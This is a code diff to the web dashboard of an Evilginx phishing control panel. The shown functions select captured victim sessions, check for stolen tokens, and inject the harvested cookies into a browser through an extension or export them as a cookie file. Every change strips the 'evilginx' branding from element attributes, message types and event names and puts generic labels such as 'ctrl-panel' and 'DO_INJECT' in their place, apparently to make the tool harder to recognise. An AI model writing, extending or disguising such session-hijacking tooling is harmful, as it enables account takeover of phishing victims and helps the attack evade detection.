@@ -801,7 +801,7 @@ tbody tr.selected{background:var(--blue-bg)}
 }
 </style>
 </head>
-<body data-app="evilginx-dashboard">
+<body data-app="ctrl-panel">
 
 <aside id="sidebar">
   <div class="sb-brand">
@@ -1308,7 +1308,7 @@ function openDetail(s) {
   document.getElementById('detailPanel').style.display = '';
   document.getElementById('detailPanel').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
 
-  window.postMessage({ type: 'EVILGINX_SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: hasTok } }, '*');
+  window.postMessage({ type: 'SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: hasTok } }, '*');
 }
 
 function closeDetail() {
@@ -1346,12 +1346,12 @@ function toast(msg, type) {
 
 var extAvailable = false;
 
-document.addEventListener('evilginx-extension-ready', function() {
+document.addEventListener('ext-ready', function() {
   extAvailable = true;
   document.getElementById('extBadge').style.display = '';
 });
 
-window.addEventListener('evilginx-inject-result', function(e) {
+window.addEventListener('inject-result', function(e) {
   var r = e.detail || {};
   var errEl = document.getElementById('injectExtErrors');
   if (r.failed && r.failed > 0 && r.errors && r.errors.length) {
@@ -1380,7 +1380,7 @@ async function injectSession() {
       document.getElementById('injectExtCount').textContent = 'Injecting ' + injectData.count + ' cookies...';
       document.getElementById('injectExtErrors').style.display = 'none';
       document.getElementById('injectModal').style.display = 'flex';
-      window.postMessage({ type: 'EVILGINX_INJECT', payload: injectData }, '*');
+      window.postMessage({ type: 'DO_INJECT', payload: injectData }, '*');
     } else {
       downloadCookieFile(injectData);
       document.getElementById('injectCookieCount').textContent =
